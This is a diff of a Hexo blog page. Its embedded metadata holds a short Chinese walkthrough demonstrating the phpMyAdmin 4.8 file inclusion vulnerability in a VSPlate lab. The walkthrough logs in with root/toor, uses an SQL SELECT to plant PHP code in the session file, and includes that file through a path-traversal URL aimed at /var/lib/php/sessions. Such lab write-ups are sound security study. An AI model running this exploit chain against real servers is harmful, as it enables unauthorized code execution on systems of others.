@@ -11,6 +11,8 @@
     
     
     
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
     <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: phpmyadmin4.8漏洞演示\n\n\n\n\n\n进入vulnsp网站，点击start to hack，跳转到VSPlat\n\n\n\n\n点击进入实验，点击开始按钮\n\n\n进入phpmyadmin登录界面，用户名：root，密码：toor登录\n\n\n点击SQL，输入如下命令：\n1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;\n\n\n\n获取自己的SESSION ID\n\n1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n\n\n\n\n\n包含SESSION文件，成功利用该漏洞\n1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n网页输入payload，页面如下，成功利用该漏洞\n\n\n\n","dateCreated":"2019-07-28T13:23:57+08:00","dateModified":"2019-07-29T21:59:17+08:00","datePublished":"2019-07-28T13:23:57+08:00","description":"Abstract: phpmyadmin4.8漏洞演示","headline":"phpmyadmin-bug","image":["http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/07/28/phpmyadmin-bug/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/07/28/phpmyadmin-bug/","keywords":"phpmyadmin, bug, 文件包含漏洞","thumbnailUrl":"http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"}</script>
     <meta name="description" content="Abstract: phpmyadmin4.8漏洞演示">
 <meta name="keywords" content="phpmyadmin,bug,文件包含漏洞">
@@ -969,31 +971,29 @@
                     <div class="media-left">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/08/01/welcome1/"
-                            aria-label=": welcome1"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": note15"
                         >
-                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city-750.jpg" width="90" height="90"/>
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
                     </div>
                     
                     <div class="media-body">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/08/01/welcome1/"
-                            aria-label=": welcome1"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": note15"
                         >
-                            <h3 class="media-heading">welcome1</h3>
+                            <h3 class="media-heading">note15</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
                                 
-                                    Aug 1, 2019
+                                    Aug 3, 2019
                                 
                             </span>
                         </span>
-                        <div class="media-content hide-xs font-merryweather"><center><font size="5">记录学习，分享知识</font></center>
-
-<a id="more"></a></div>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: php基础语法和变量</p></div>
                     </div>
                     <div style="clear:both;"></div>
                     <hr>
@@ -1006,7 +1006,7 @@
                 data-message-zero="no post found"
                 data-message-one="1 post found"
                 data-message-other="{n} posts found">
-                10 posts found
+                12 posts found
             </p>
         </div>
     </div>
